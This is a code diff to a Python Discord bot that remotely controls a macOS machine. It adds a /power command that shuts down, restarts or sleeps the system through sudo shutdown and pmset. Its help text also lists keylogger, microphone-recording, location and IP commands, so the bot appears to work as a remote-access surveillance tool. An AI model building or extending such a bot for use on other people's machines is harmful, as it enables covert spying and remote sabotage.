@@ -515,6 +515,61 @@ def set_volume(level):
     except Exception as e:
         return False, str(e)
 
+def control_system_power(action: str):
+    """Control system power state (shutdown, restart, sleep).
+    
+    Args:
+        action: 'shutdown', 'restart', or 'sleep'
+    
+    Returns:
+        tuple: (success: bool, message: str)
+    """
+    action = action.lower()
+    
+    try:
+        if action == 'shutdown':
+            # Use sudo shutdown command for immediate shutdown
+            result = subprocess.run(['sudo', 'shutdown', '-h', 'now'], 
+                                  capture_output=True, text=True, check=False)
+            if result.returncode == 0:
+                return True, "System shutdown initiated"
+            else:
+                return False, f"Shutdown failed: {result.stderr.strip() if result.stderr else 'Unknown error'}"
+                
+        elif action == 'restart':
+            # Use sudo shutdown command for restart
+            result = subprocess.run(['sudo', 'shutdown', '-r', 'now'], 
+                                  capture_output=True, text=True, check=False)
+            if result.returncode == 0:
+                return True, "System restart initiated"
+            else:
+                return False, f"Restart failed: {result.stderr.strip() if result.stderr else 'Unknown error'}"
+                
+        elif action == 'sleep':
+            # Use pmset to put system to sleep (no sudo required for sleep)
+            result = subprocess.run(['pmset', 'sleepnow'], 
+                                  capture_output=True, text=True, check=False)
+            if result.returncode == 0:
+                return True, "System going to sleep"
+            else:
+                # Fallback: try osascript method
+                try:
+                    subprocess.run(['osascript', '-e', 'tell application "System Events" to sleep'], 
+                                 check=True, timeout=5)
+                    return True, "System going to sleep"
+                except subprocess.CalledProcessError:
+                    return False, f"Sleep failed: {result.stderr.strip() if result.stderr else 'Unknown error'}"
+                except subprocess.TimeoutExpired:
+                    return True, "System going to sleep (command timed out, likely successful)"
+                    
+        else:
+            return False, f"Unsupported power action: {action}. Use 'shutdown', 'restart', or 'sleep'"
+            
+    except FileNotFoundError as e:
+        return False, f"Required system command not found: {str(e)}"
+    except Exception as e:
+        return False, f"Error controlling power: {str(e)}"
+
 def is_process_running(candidate_names):
     """Return True if any process name contains any of the candidate name substrings (case-insensitive)."""
     try:
@@ -1075,6 +1130,7 @@ async def help_command(interaction: discord.Interaction):
 /mic - Record audio from the microphone
 /media - Control media playback (play/pause/next/prev)
 /volume - Set system volume (0-100%)
+/power - Control system power (sleep/restart/shutdown)
 /keylogger - Start or stop the keylogger
 /sysinfo - Show comprehensive system information (location, battery, CPU, RAM, etc.)
 /ip - Show IP address
@@ -1146,6 +1202,64 @@ async def volume(interaction: discord.Interaction, level: int):
         await interaction.response.send_message(f"🔊 Volume set to {result}%")
     else:
         await interaction.response.send_message(f"Error setting volume: {result}")
+
+@bot.tree.command(name='power', description='Control system power state (shutdown, restart, sleep)')
+@discord.app_commands.describe(action='Power action to perform')
+@discord.app_commands.choices(action=[
+    discord.app_commands.Choice(name='💤 Sleep', value='sleep'),
+    discord.app_commands.Choice(name='🔄 Restart', value='restart'),
+    discord.app_commands.Choice(name='⚡ Shutdown', value='shutdown')
+])
+async def power_control(interaction: discord.Interaction, action: discord.app_commands.Choice[str]):
+    """Control system power state with confirmation and warnings."""
+    try:
+        # Add warning for destructive actions
+        if action.value in ['shutdown', 'restart']:
+            warning_msg = f"⚠️ **WARNING**: This will {action.value} the system immediately!\n"
+            warning_msg += f"🖥️ **Action**: {action.name}\n"
+            from datetime import datetime
+            warning_msg += f"⏰ **Time**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            warning_msg += f"🔒 **Note**: This action cannot be undone remotely\n\n"
+            warning_msg += f"Proceeding with {action.value}..."
+            
+            await interaction.response.send_message(warning_msg)
+            
+            # Small delay to ensure the message is sent before system action
+            await asyncio.sleep(2)
+            
+            success, result = control_system_power(action.value)
+            
+            if success:
+                # This message might not be sent if shutdown/restart is immediate
+                try:
+                    await interaction.followup.send(f"✅ {result}")
+                except Exception:
+                    pass  # System might be shutting down
+            else:
+                await interaction.followup.send(f"❌ {result}")
+                
+        else:  # Sleep action
+            await interaction.response.send_message(f"😴 Putting system to sleep...")
+            
+            success, result = control_system_power(action.value)
+            
+            if success:
+                try:
+                    await interaction.followup.send(f"✅ {result}")
+                except Exception:
+                    pass  # System might be sleeping
+            else:
+                await interaction.followup.send(f"❌ {result}")
+                
+    except Exception as e:
+        logger.error(f"Error in power control: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error controlling power: {str(e)}")
+            else:
+                await interaction.followup.send(f"❌ Error controlling power: {str(e)}")
+        except Exception:
+            pass
 
 @bot.tree.command(name='keylogger', description='Start or stop the keylogger')
 @discord.app_commands.describe(action='Keylogger action')
